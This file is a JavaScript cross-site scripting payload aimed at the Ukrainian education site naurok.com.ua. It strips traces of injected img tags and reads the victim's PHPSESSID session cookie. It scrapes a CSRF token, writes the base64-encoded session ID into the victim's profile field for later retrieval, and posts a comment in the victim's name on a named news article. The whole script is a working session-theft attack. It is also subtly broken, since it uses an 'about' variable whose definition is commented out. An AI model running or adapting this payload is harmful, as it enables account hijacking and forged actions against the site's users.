(async function() {
    const imgs = document.querySelectorAll('img[i]');
    console.log(imgs);
    for (const img of imgs) {
        img.removeAttribute('onload');
        img.removeAttribute('i');
        img.setAttribute('src', img.getAttribute('src').slice(0, -1));
        console.log(img);
    }

    const cookie = document.cookie;
    const sessidMatch = cookie.match(/PHPSESSID=([a-z0-9]+)/);
    if (!sessidMatch) return console.log('no ssid');
    const sessid = sessidMatch[1];
    const url = document.URL;
    const referrer = document.referrer;

    const res = await fetch('https://naurok.com.ua');
    const text = await res.text();
    const match = text.match(/meta name="csrf-token" content="(.+)"/);
    if (!match) return console.log('no csrf');
    const csrf = match[1];
    if (!csrf) return console.log('no csrf 2');

    const promises = [];

    async function updateProfile () {
        const preferences = await fetch('https://naurok.com.ua/preferences');
        const html = await preferences.text();
        console.log(html);
        // const about = html.match(/<textarea id="accountpreferences-about" class="form-control" name="AccountPreferences.about." rows="5">(.+)<.textarea>/)[1] + '\n' + url + '\n' + referrer;
        
        const text = encode(sessid);
        await fetch("https://naurok.com.ua/preferences", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryKnLgq0VhMq7Xl2Pu",
            },
            "referrer": "https://naurok.com.ua/preferences",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": `------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name=\"_csrf\"\r\n\r\n${csrf}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name=\"AccountPreferences[position]\"\r\n\r\n${text}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name=\"AccountPreferences[about]\"\r\n\r\n${about}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data;`,
            "method": "POST",
            "mode": "cors",
            "credentials": "include",
            redirect: 'manual',
        });
    }

    function encode (text) {
        return btoa(text);
    }
    promises.push(updateProfile());

    promises.push((async function () {
        const commentP = await fetch('https://naurok.com.ua/post/sergiy-gorbachov-ne-zmushuyte-pedagogiv-povertatisya-v-naseleni-punkti-doki-ce-ne-dozvolit-viyskova-administraciya');
    
        const text2 = await commentP.text();
        const m = text2.match(/form id="comment-form" class="comment-box" action="\/comment\/default\/create\?entity=(.+)" method="post"/);
        if (!m) return;
        const e = m[1];
    
        const amp = atob('Jg==');
        await fetch(`https://naurok.com.ua/comment/default/create?entity=${e}`, {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9,uk;q=0.8,ru;q=0.7",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-csrf-token": `${csrf}`,
                "x-requested-with": "XMLHttpRequest"
            },
            "referrer": "https://naurok.com.ua/post/sergiy-gorbachov-ne-zmushuyte-pedagogiv-povertatisya-v-naseleni-punkti-doki-ce-ne-dozvolit-viyskova-administraciya",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": `_csrf=${csrf}${amp}CommentModel[content]=<a href="/"></a>${amp}CommentModel[parentId]=${amp}CommentModel[url]=/post/sergiy-gorbachov-ne-zmushuyte-pedagogiv-povertatisya-v-naseleni-punkti-doki-ce-ne-dozvolit-viyskova-administraciya`,
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        });
    })());
    await Promise.all(promises);
})();
